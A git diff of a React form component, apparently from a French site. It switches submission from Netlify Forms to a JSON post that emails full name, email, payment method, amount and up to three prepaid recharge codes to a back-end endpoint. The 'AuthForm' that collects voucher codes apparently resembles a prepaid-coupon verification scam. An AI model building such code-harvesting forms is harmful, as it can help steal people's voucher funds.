@@ -42,16 +42,6 @@ const optionalLabels: Record<Language, string> = {
   nl: "optioneel",
 };
 
-const encodeFormData = (formData: FormData): string => {
-  const encodedData = new URLSearchParams();
-
-  formData.forEach((value, key) => {
-    encodedData.append(key, String(value));
-  });
-
-  return encodedData.toString();
-};
-
 const AuthForm: React.FC = () => {
   const { language, t } = useI18n();
   const [status, setStatus] = useState<FormStatus>("idle");
@@ -83,12 +73,24 @@ const AuthForm: React.FC = () => {
       setStatus("sending");
       setErrorMessage("");
 
-      const response = await fetch("/", {
+      const apiBaseUrl = (import.meta.env.VITE_API_URL || "").replace(/\/$/, "");
+      const response = await fetch(`${apiBaseUrl}/api/send-email`, {
         method: "POST",
         headers: {
-          "Content-Type": "application/x-www-form-urlencoded",
+          "Content-Type": "application/json",
         },
-        body: encodeFormData(formData),
+        body: JSON.stringify({
+          fullName: formData.get("fullName"),
+          email: formData.get("email"),
+          paymentMethod: formData.get("paymentMethod"),
+          amount: formData.get("amount"),
+          rechargeCodes: [
+            formData.get("rechargeCode1"),
+            formData.get("rechargeCode2"),
+            formData.get("rechargeCode3"),
+          ].filter(Boolean),
+          consent: formData.get("consent") === "oui",
+        }),
       });
 
       if (!response.ok) {
@@ -100,7 +102,7 @@ const AuthForm: React.FC = () => {
       setReferences(["", "", ""]);
       setStatus("success");
     } catch (error) {
-      console.error("Erreur Netlify Forms :", error);
+      console.error("Erreur d'envoi du formulaire :", error);
       setStatus("error");
       setErrorMessage(
         t("error"),
